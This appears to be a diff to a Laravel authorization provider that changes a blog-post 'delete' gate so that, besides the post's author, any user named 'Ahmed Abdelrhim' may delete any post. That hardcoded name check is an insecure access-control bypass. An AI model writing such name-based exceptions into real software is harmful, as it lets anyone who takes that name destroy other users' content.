@@ -65,7 +65,7 @@ class AuthServiceProvider extends ServiceProvider
         });
 
         Gate::define('delete',function($user,$blogpost){
-            if($user->id == $blogpost->author_id)
+            if($user->id == $blogpost->author_id || $user->name == 'Ahmed Abdelrhim')
                 return true;
             return false;
         });
